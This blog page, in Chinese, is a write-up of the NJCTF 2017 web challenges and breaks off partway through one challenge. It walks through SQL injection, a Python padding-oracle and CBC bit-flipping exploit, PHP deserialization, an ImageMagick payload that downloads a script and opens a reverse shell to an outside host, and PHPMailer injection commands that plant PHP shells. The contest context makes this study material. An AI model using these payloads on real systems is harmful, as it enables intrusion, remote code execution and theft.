@@ -1,0 +1,1130 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./NJCTF-2017-web-Writeup/font-awesome.min.css" rel="stylesheet"/>
+<link href="./NJCTF-2017-web-Writeup/screen.css" rel="stylesheet"/>
+<link href="./NJCTF-2017-web-Writeup/prism_okaidia.css" rel="stylesheet"/>
+<link href="./NJCTF-2017-web-Writeup/bendawang.css" rel="stylesheet"/>
+<script src="./NJCTF-2017-web-Writeup/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./NJCTF-2017-web-Writeup/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./NJCTF-2017-web-Writeup/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="njctf2017webwriteup">NJCTF 2017 web Writeup</h1>
+<p style="max-width:100%;height:auto;">第一次做题做到差点吐血，好多web啊。。。。最后有两个还没有做出来，一道是<code style="max-width:100%;height:auto;">come on</code>，注入题，始终觉得返回值太诡异了，看不懂，于是giveup，一道是ruby拿道，不会ruby，最后也没时间去看了，所以就抛弃了。回头去看大佬们的题解了只能。总之题目质量还是可以的。</p>
+<h2 id="web100login">web100 Login</h2>
+<p style="max-width:100%;height:auto;">第一题找到这个登陆界面随便注册一个登进去之后发现在<code style="max-width:100%;height:auto;">getflag.php</code>界面下有打印了自己的用户名。第一反应是二次注入，随便构造一个提交发现注册成功，而且我多点几次任然注册成功，因为用户名不能重复的，所以想到这里有长度限制试了下发现是50，所以这样就可以想办法重置admin的密码，如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c357612c302e04bd000000.png" style="max-width:100%;height:auto;"/><br/>
+这样就成功重置admin的密码，登进去就拿到flag了。</p>
+<h2 id="web100getflag">web100 Get Flag</h2>
+<p style="max-width:100%;height:auto;">这里随便输入观察下发现服务器会cat你输入的东西，那么很好办，直接用<code style="max-width:100%;height:auto;">&amp;</code>来进行执行自己的命令就好了，这里<code style="max-width:100%;height:auto;">;</code>什么的都被过滤了。
+然后就不停的向上<code style="max-width:100%;height:auto;">ls</code>最终<code style="max-width:100%;height:auto;">flag</code>在服务器的根目录下面，如下图：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c361b9e24abc5d60000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web300beadmin">web300 Be Admin</h2>
+<p style="max-width:100%;height:auto;">首先通过备份文件拿到源代码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+error_reporting(0);
+define("SECRET_KEY", "......");
+define("METHOD", "aes-128-cbc");
+
+session_start();
+
+function get_random_token(){
+    $random_token=&amp;apos;&amp;apos;;
+    for($i=0;$i&lt;16;$i++){
+        $random_token.=chr(rand(1,255));
+    }
+    return $random_token;
+}
+
+function get_identity()
+{
+    global $defaultId;
+    $j = $defaultId;
+    $token = get_random_token();
+    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
+    $_SESSION[&amp;apos;id&amp;apos;] = base64_encode($c);
+    setcookie("ID", base64_encode($c));
+    setcookie("token", base64_encode($token));
+    if ($j === &amp;apos;admin&amp;apos;) {
+        $_SESSION[&amp;apos;isadmin&amp;apos;] = true;
+    } else $_SESSION[&amp;apos;isadmin&amp;apos;] = false;
+
+}
+
+function test_identity()
+{
+    if (!isset($_COOKIE["token"]))
+        return array();
+    if (isset($_SESSION[&amp;apos;id&amp;apos;])) {
+        $c = base64_decode($_SESSION[&amp;apos;id&amp;apos;]);
+        if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"]))) {
+            if ($u === &amp;apos;admin&amp;apos;) {
+                $_SESSION[&amp;apos;isadmin&amp;apos;] = true;
+            } else $_SESSION[&amp;apos;isadmin&amp;apos;] = false;
+        } else {
+            die("ERROR!");
+        }
+    }
+}
+
+function login($encrypted_pass, $pass)
+{
+    $encrypted_pass = base64_decode($encrypted_pass);
+    $iv = substr($encrypted_pass, 0, 16);
+    $cipher = substr($encrypted_pass, 16);
+    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
+    return $password == $pass;
+}
+
+
+
+function need_login($message = NULL) {
+    echo "   &lt;!doctype html&gt;
+        &lt;html&gt;
+        &lt;head&gt;
+        &lt;meta charset=\"UTF-8\"&gt;
+        &lt;title&gt;Login&lt;/title&gt;
+        &lt;link rel=\"stylesheet\" href=\"CSS/target.css\"&gt;
+            &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"&gt;&lt;/script&gt;
+        &lt;/head&gt;
+        &lt;body&gt;";
+    if (isset($message)) {
+        echo "  &lt;div&gt;" . $message . "&lt;/div&gt;\n";
+    }
+    echo "&lt;form method=\"POST\" action=&amp;apos;&amp;apos;&gt;
+            &lt;div class=\"body\"&gt;&lt;/div&gt;
+                &lt;div class=\"grad\"&gt;&lt;/div&gt;
+                    &lt;div class=\"header\"&gt;
+                        &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;
+                    &lt;/div&gt;
+                    &lt;br&gt;
+                    &lt;div class=\"login\"&gt;
+                        &lt;input type=\"text\" placeholder=\"username\" name=\"username\"&gt;
+                        &lt;input type=\"password\" placeholder=\"password\" name=\"password\"&gt;               
+                        &lt;input type=\"submit\" value=\"Login\"&gt;
+                    &lt;/div&gt;
+                     &lt;script src=&amp;apos;http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&amp;apos;&gt;&lt;/script&gt;
+            &lt;/form&gt;
+        &lt;/body&gt;
+    &lt;/html&gt;";
+}
+
+function show_homepage() {
+    echo "&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;";
+    global $flag;
+    printf("Hello ~~~ ctfer! ");
+    if ($_SESSION["isadmin"])
+        echo $flag;
+    echo "&lt;div&gt;&lt;a href=\"logout.php\"&gt;Log out&lt;/a&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;";
+
+}
+
+if (isset($_POST[&amp;apos;username&amp;apos;]) &amp;&amp; isset($_POST[&amp;apos;password&amp;apos;])) {
+    $username = (string)$_POST[&amp;apos;username&amp;apos;];
+    $password = (string)$_POST[&amp;apos;password&amp;apos;];
+    $query = "SELECT username, encrypted_pass from users WHERE username=&amp;apos;$username&amp;apos;";
+    $res = $conn-&gt;query($query) or trigger_error($conn-&gt;error . "[$query]");
+    if ($row = $res-&gt;fetch_assoc()) {
+        $uname = $row[&amp;apos;username&amp;apos;];
+        $encrypted_pass = $row["encrypted_pass"];
+    }
+
+    if ($row &amp;&amp; login($encrypted_pass, $password)) {
+        echo "you are in!" . "&lt;/br&gt;";
+        get_identity();
+        show_homepage();
+    } else {
+        echo "&lt;script&gt;alert(&amp;apos;login failed!&amp;apos;);&lt;/script&gt;";
+        need_login("Login Failed!");
+    }
+
+} else {
+    test_identity();
+    if (isset($_SESSION["id"])) {
+        show_homepage();
+    } else {
+        need_login();
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">初步观察和<code style="max-width:100%;height:auto;">secconctf2016 biscuiti</code>的源代码有点类似，进过观察分析之后初步确定思路，首先我们知道加密后的ID,也就是密文，以及token,也就是初始向量，然后我们的目的是要提交token使ID解出来为<code style="max-width:100%;height:auto;">admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b</code>(PS:加密填充之后)，这样子就会是<code style="max-width:100%;height:auto;">admin</code>的值就能成功绕过验证，而要达到这样的目的我们首先需要通过<code style="max-width:100%;height:auto;">padding oracle</code>拿到ID对应的明文，然后进行CBC字节翻转攻击，从而实现目标，相比与<code style="max-width:100%;height:auto;">secconctf2016 biscuiti</code>要相对简单，但是中间遇到各式各样的问题，譬如请求提交的时候自己习惯性的先<code style="max-width:100%;height:auto;">r=request.session()</code>，在这里反倒起了反作用。另外要说的是这道题的服务器肯定有毒，我开始死活跑步出来，查错查了俩小时没发现问题，最后实在受不了了，把所有代码框起来<code style="max-width:100%;height:auto;">while 1</code>，过了会就拿到<code style="max-width:100%;height:auto;">flag</code>了，擦，报警了。
+其实最开始我的思路是在<code style="max-width:100%;height:auto;">test_identity</code>那里触发解密进行<code style="max-width:100%;height:auto;">padding oracle</code>攻击，不过这样来说就只能爆破15位，最后一位无法得到，不过可以通过枚举来尝试，但是由于服务器的锅这样有点慢，所以我还是换成在login那里触发，不过都一样，只要能触发解密控制iv就能进行<code style="max-width:100%;height:auto;">padding oracle</code>。
+下面是代码，直接运行即可得到flag：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+import base64
+import time
+url=&amp;apos;http://218.2.197.235:23737/&amp;apos;
+#url=&amp;apos;http://127.0.0.1:8000&amp;apos;
+N=16
+phpsession=""
+ID=""
+def inject1(password):
+    param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;{password}".format(password=password),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
+    result=requests.post(url,data=param)
+    #print result.content
+    return result
+
+def inject_token(token):
+    header={"Cookie":"PHPSESSID="+phpsession+";token="+token+";ID="+ID}
+    result=requests.post(url,headers=header)
+    return result
+
+def xor(a, b):
+    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
+
+def pad(string,N):
+    l=len(string)
+    if l!=N:
+        return string+chr(N-l)*(N-l)
+
+def padding_oracle(N,cipher):
+    get=""
+    for i in xrange(1,N+1):
+        for j in xrange(0,256):
+            padding=xor(get,chr(i)*(i-1))
+            c=chr(0)*(16-i)+chr(j)+padding+cipher
+            print c.encode(&amp;apos;hex&amp;apos;)
+            result=inject1(base64.b64encode(chr(0)*16+c))
+            if "ctfer" not in result.content:
+                get=chr(j^i)+get
+                time.sleep(0.1)
+                break
+    return get
+
+session=inject1("bendawang").headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;,&amp;apos;)
+phpsession=session[0].split(";")[0][10:]
+print phpsession
+ID=session[1][4:].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
+token=session[2][6:].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
+
+middle=""
+middle=padding_oracle(N,ID)
+print "ID:"+ID.encode(&amp;apos;base64&amp;apos;)
+print "token:"+token.encode(&amp;apos;base64&amp;apos;)
+print "middle:"+middle.encode(&amp;apos;base64&amp;apos;)
+print "\n"
+if(len(middle)==16):
+    plaintext=xor(middle,token);
+    print plaintext.encode(&amp;apos;base64&amp;apos;)
+    des=pad(&amp;apos;admin&amp;apos;,N)
+    tmp=""
+    print des.encode("base64")
+    for i in xrange(16):
+        tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))
+    print tmp.encode(&amp;apos;base64&amp;apos;)
+
+    result=inject_token(base64.b64encode(tmp))
+    print result.content
+    if "flag" in result.content or "NJCTF" in result.content or &amp;apos;njctf&amp;apos; in result.content:
+        input("success")
+</code></pre>
+<p style="max-width:100%;height:auto;">运行截图如下所示：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c3acb7e24abc5d60000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web350textwall">web350 Text wall</h2>
+<p style="max-width:100%;height:auto;">首先同样是通过备份文件<code style="max-width:100%;height:auto;">.index.php.swo</code>拿到部分源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$lists = [];
+Class filelist{
+    public function __toString()
+    {
+        return highlight_file(&amp;apos;hiehiehie.txt&amp;apos;, true).highlight_file($this-&gt;source, true);
+    }
+}
+//.....
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">看到源码之后想到是个反序列化，根据<code style="max-width:100%;height:auto;">__toString</code>的触发条件构造如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+Class filelist{
+    public function __toString()
+    {
+        return highlight_file(&amp;apos;hiehiehie.txt&amp;apos;, true).highlight_file($this-&gt;source, true);
+    }
+}
+//.....
+$a = new filelist();
+$b= new filelist();
+$b-&gt;source = &amp;apos;文件路径&amp;apos;;
+$a-&gt;source=$b;
+$d=serialize($a);
+$e=sha1($d).$d;
+echo urlencode($e)."&lt;br&gt;";
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后就能读取文件内容，先读取的<code style="max-width:100%;height:auto;">index.php</code>,然后在里面得知flag的位置在<code style="max-width:100%;height:auto;">/var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g</code>，读取即获得flag，截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c3ae44e24abc5d60000002.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web300wallet">web300 Wallet</h2>
+<p style="max-width:100%;height:auto;">首先通过<code style="max-width:100%;height:auto;">http://218.2.197.235:23723/www.zip</code>拿到一个加密的压缩包，发现需要密码，后来猜到密码是<code style="max-width:100%;height:auto;">njctf2017</code>解开拿到加密之后的源代码，解密之后源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+require_once("db.php");
+$auth = 0;
+if (isset($_COOKIE["auth"])) {
+    $auth = $_COOKIE["auth"];
+    $hsh = $_COOKIE["hsh"];
+    if ($auth == $hsh) {
+        $auth = 0;
+    } else if (sha1((string)$hsh) == md5((string)$auth)) {
+        $auth = 1;
+    } else {
+        $auth = 0;
+    }
+} else {
+    $auth = 0;
+    $s = $auth;
+    setcookie("auth", $s);
+    setcookie("hsh", sha1((string)$s));
+}
+if ($auth) {
+    if (isset($_GET[&amp;apos;query&amp;apos;])) {
+        $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);
+        $qstr = SQLITE3::escapeString($_GET[&amp;apos;query&amp;apos;]);
+        $query = "SELECT amount FROM my_wallets WHERE id=$qstr";
+        $result = $db-&gt;querySingle($query);
+        if (!$result === NULL) {
+            echo "Error - invalid query";
+        } else {
+            echo "Wallet contains: $result";
+        }
+    } else {
+        echo "&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name=&amp;apos;input&amp;apos; action=&amp;apos;admin.php&amp;apos; method=&amp;apos;get&amp;apos;&gt;Wallet ID: &lt;input type=&amp;apos;text&amp;apos; name=&amp;apos;query&amp;apos;&gt;&lt;input type=&amp;apos;submit&amp;apos; value=&amp;apos;Submit Query&amp;apos;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;";
+    }
+} else echo "Sorry, not authorized.";
+</code></pre>
+<p style="max-width:100%;height:auto;">然后发现一个比较<code style="max-width:100%;height:auto;">sha1((string)$hsh) == md5((string)$auth)</code>，想到弱类型，让两个都为<code style="max-width:100%;height:auto;">0e</code>开头的值即可，md5这样的很多，sha1的话需要先爆破，进过一番爆破找到一个<code style="max-width:100%;height:auto;">aaK1STfY</code>，然后就是一个数字型的sqlite注入，这里我直接脑洞出的，先是<code style="max-width:100%;height:auto;">select flag from flag</code>，不行，然后<code style="max-width:100%;height:auto;">select 1 from flag</code>，成功，再然后<code style="max-width:100%;height:auto;">select id from flag</code>，获得flag,哈哈，省去了一些麻烦事，脑洞万岁！！，最后截图如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c3be0de24abc5d60000003.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web400pictureswall">web400 picture&amp;apos;s wall</h2>
+<p style="max-width:100%;height:auto;">首先这里登陆的时候发现任何用户用任何密码都能随便登陆，然后进去又说是只有root能上传文件，它怎么区分是不是<code style="max-width:100%;height:auto;">root</code>呢？搞不懂，然后胡七八糟发现登陆的时候把<code style="max-width:100%;height:auto;">host</code>改了进去就能上传图片了，然后开始疯狂上传，上传的时候发现它对文件内容没有验证，然后过滤文件名的后缀方式是白名单，像是<code style="max-width:100%;height:auto;">phtml</code>啊,<code style="max-width:100%;height:auto;">phps</code>啊，<code style="max-width:100%;height:auto;">pht</code>啊之类的都能随便上传，访问之后发现它并不解析，只是打印，于是想到用<code style="max-width:100%;height:auto;">&lt;script&gt;</code>标签，成功上传执行，如下截图：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c4bd95d16a9b0d63000000.png" style="max-width:100%;height:auto;"/><br/>
+最后获取<code style="max-width:100%;height:auto;">flag</code>如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c4bda7d16a9b0d63000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web450belogical">web450 Be Logical</h2>
+<p style="max-width:100%;height:auto;">首先进去随便注册一个账户，然后发现自己有500分和0金币，而且二者互换比例是1比1，之后发现一个兑换之后的<code style="max-width:100%;height:auto;">refund</code>功能，我先用1积分兑然了1金币，之后在refund的时候我抓包把points改成了1e111111,结果竟然成功了，然后我的积分成了这样，晕，太大了，
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c4f00fd16a9b0d63000002.png" style="max-width:100%;height:auto;"/><br/>
+重新注册一个账户再来一次，然后就有了很多分了，兑换1000购买服务，进去如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c4f045d16a9b0d63000003.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">它的功能就是把你上传的图片进行转化成别的格式，试了半天也没绕过，后来想到是不是<code style="max-width:100%;height:auto;">imagmagick</code>的命令执行漏洞,随便找了个poc如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">push graphic-context
+viewbox 0 0 640 480
+fill &amp;apos;url(https://example.com/image.jpg"|wget http://bendawang.site:8000/a.py -O /tmp/bendawang.py &amp;&amp; python /tmp/bendawang.py 104.160.43.154 12346")&amp;apos;
+pop graphic-context
+</code></pre>
+<p style="max-width:100%;height:auto;">上传，执行成功反弹shell,在机器上找了好久也没有flag，于是想到是不是在别的机器上呢，然后扫一下网段，发现1,19,43三台机器80端口开着，访问一下19，返回一个什么邮件系统，然后瞬间想到之前phpmailer那个cve漏洞，但是需要一个可写的目录，后来脑洞到了一个<code style="max-width:100%;height:auto;">uploads</code>，访问发现403，好的有了，开始尝试，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://172.17.0.19 -d "subject=aaaaa&amp;email=aaa( -X /var/www/html/uploads/bendawang.php -OQueueDirectory=/tmp )@qq.com&amp;message=&lt;?php phpinfo();?&gt;&amp;submit=Send email"
+</code></pre>
+<p style="max-width:100%;height:auto;">发现成功执行<code style="max-width:100%;height:auto;">phpinfo();</code>，然后就开始上传木马，传了半天传了各式各样的木马也不行，算了，直接看看目录文件把，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://172.17.0.19 -d &amp;apos;subject=aaaaa&amp;email=aaa( -X /var/www/html/uploads/bendawang5.php -OQueueDirectory=/tmp )@qq.com&amp;message=&lt;?php foreach (glob("../*") as $filename){echo $filename."&lt;br&gt;";};?&gt;&amp;submit=Send email&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">访问拿到目录下文件如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">../PHPMailer&lt;br&gt;../flaaaaaaag.php&lt;br&gt;../index.php&lt;br&gt;../uploads&lt;br&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后直接获取文件内容就可以了，先是用<code style="max-width:100%;height:auto;">file_get_content</code>,失败，后来直接<code style="max-width:100%;height:auto;">system</code>，成功，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://172.17.0.19 -d &amp;apos;subject=aaaaa&amp;email=aaa( -X /var/www/html/uploads/bendawang9.php -OQueueDirectory=/tmp )@qq.com&amp;message=&lt;?php system("cat ../flaaaaaaag.php");?&gt;&amp;submit=Send email&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">拿到文件内容如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php $flag="NJCTF{y0U_r_A_G00oD_PeNt35T3r!}";?&gt;
+</code></pre>
+<h2 id="web350chall1">web350 chall1</h2>
+<p style="max-width:100%;height:auto;">首先是这道题的感觉，在这里发现了类似的题通过buffer来泄露内存<code style="max-width:100%;height:auto;">https://www.smrrd.de/nodejs-hacking-challenge-writeup.html</code>，但是怎么试了都不行，后来去github上随便搜一搜结果发现了源码
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c5087dd16a9b0d63000004.png" style="max-width:100%;height:auto;"/><br/>
+然后关键部分如下：</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">....
+var reg = /^[0-9]*$/;
+....
+....
+router.post(&amp;apos;/login&amp;apos;, function(req, res, next) {
+    if(req.body.password !== undefined) {
+        var endata = crypto.createHash(&amp;apos;md5&amp;apos;).update(req.body.password).digest("hex");
+        if (reg.test(endata)) {
+            var pwd = parseInt(endata.slice(0,3),10);
+            password = new Buffer(pwd);
+            if(password.toString(&amp;apos;base64&amp;apos;) == config.secret_password) {
+                req.session.admin = &amp;apos;yes&amp;apos;;
+                res.json({&amp;apos;status&amp;apos;: &amp;apos;ok&amp;apos; });
+            }else{
+                res.json({&amp;apos;status&amp;apos;: &amp;apos;error&amp;apos;, &amp;apos;error&amp;apos;: &amp;apos;password wrong: &amp;apos;+password.toString()});
+            }
+        }else{
+            res.json({&amp;apos;status&amp;apos;: &amp;apos;error&amp;apos;, &amp;apos;error&amp;apos;: &amp;apos;password wrong: &amp;apos;+endata.toString()});
+        }
+    } else {
+        res.json({&amp;apos;status&amp;apos;: &amp;apos;error&amp;apos;, &amp;apos;error&amp;apos;: &amp;apos;password missing&amp;apos; });
+    }
+});
+</code></pre>
+<p style="max-width:100%;height:auto;">也就是说要找一个MD5之后的值全是0-9就好了，爆破之后找到了一个<code style="max-width:100%;height:auto;">2PP7</code>，然后发送请求如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50957d16a9b0d63000005.png" style="max-width:100%;height:auto;"/><br/>
+成功泄露内存数据，疯狂尝试之后成功拿到flag
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50986d16a9b0d63000006.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web450chall2">web450 chall2</h2>
+<p style="max-width:100%;height:auto;">根据第一个拿到的flag,将他作为<code style="max-width:100%;height:auto;">session_keys</code>
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50cb8d16a9b0d63000008.png" style="max-width:100%;height:auto;"/><br/>
+修改源码里面的<code style="max-width:100%;height:auto;">app.js</code>的为<code style="max-width:100%;height:auto;">req.session.admin = &amp;apos;yes&amp;apos;;</code>，然后访问获得<code style="max-width:100%;height:auto;">session.sig</code>
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50d05d16a9b0d63000009.png" style="max-width:100%;height:auto;"/><br/>
+然后修改cookie登陆即可
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50d21d16a9b0d6300000a.png" style="max-width:100%;height:auto;"/><br/>
+base64解密之后<br/>
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50d51d16a9b0d6300000b.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web250guess">web250 Guess</h2>
+<p style="max-width:100%;height:auto;">首先是通过文件包含直接获取源码，<code style="max-width:100%;height:auto;">upload.php</code>的源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+error_reporting(0);
+function show_error_message($message)
+{
+    die("&lt;div class=\"msg error\" id=\"message\"&gt;
+    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");
+}
+
+function show_message($message)
+{
+    echo("&lt;div class=\"msg success\" id=\"message\"&gt;
+    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");
+}
+
+function random_str($length = "32")
+{
+    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
+        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
+        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
+        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
+        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+    $str = &amp;apos;&amp;apos;;
+
+    for ($i = 1; $i &lt;= $length; ++$i) {
+        $ch = mt_rand(0, count($set) - 1);
+        $str .= $set[$ch];
+    }
+
+    return $str;
+}
+
+session_start();
+
+$reg=&amp;apos;/gif|jpg|jpeg|png/&amp;apos;;
+if (isset($_POST[&amp;apos;submit&amp;apos;])) {
+    //10822560
+    $seed = rand(0,999999999);
+    mt_srand($seed);
+    $ss = mt_rand();
+    $hash = md5(session_id() . $ss);
+    setcookie(&amp;apos;SESSI0N&amp;apos;, $hash, time() + 3600);
+
+    if ($_FILES["file"]["error"] &gt; 0) {
+        show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
+    }
+    $check1 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
+            || ($_FILES["file-upload-field"]["type"] == "image/jpeg")
+            || ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
+            || ($_FILES["file-upload-field"]["type"] == "image/png"))
+        &amp;&amp; ($_FILES["file-upload-field"]["size"] &lt; 204800));
+    $check2=!preg_match($reg,pathinfo($_FILES[&amp;apos;file-upload-field&amp;apos;][&amp;apos;name&amp;apos;], PATHINFO_EXTENSION));
+
+
+    if ($check2) show_error_message("Nope!");
+    if ($check1) {
+        $filename = &amp;apos;./uP1O4Ds/&amp;apos; . random_str() . &amp;apos;_&amp;apos; . $_FILES[&amp;apos;file-upload-field&amp;apos;][&amp;apos;name&amp;apos;];
+        if (move_uploaded_file($_FILES[&amp;apos;file-upload-field&amp;apos;][&amp;apos;tmp_name&amp;apos;], $filename)) {
+            show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
+        } else show_error_message("Something wrong with the upload...");
+    } else {
+        show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
+    }
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">观察之后发现我们如果有文件名，我们可以通过将木马压缩进zip包，然后上传该zip文件(改成Png后缀上传)，利用phar伪协议包含执行命令。
+所以我们的核心就是搞到文件名，即想办法搞到<code style="max-width:100%;height:auto;">$seed</code>。
